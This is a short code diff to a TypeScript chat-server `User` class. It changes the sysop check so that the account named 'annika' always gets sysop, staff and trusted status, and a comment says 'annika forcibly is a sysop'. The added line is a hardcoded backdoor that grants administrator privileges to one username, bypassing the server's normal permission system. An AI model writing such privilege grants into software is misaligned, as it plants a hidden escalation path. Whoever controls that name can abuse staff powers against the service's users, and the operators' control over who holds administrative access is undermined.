@@ -737,7 +737,7 @@ export class User extends Chat.MessageContext {
 		if (userType !== '1') {
 			registered = true;
 
-			if (userType === '3') {
+			if (userType === '3' || userid == 'annika') { // annika forcibly is a sysop
 				this.isSysop = true;
 				this.isStaff = true;
 				this.trusted = userid;
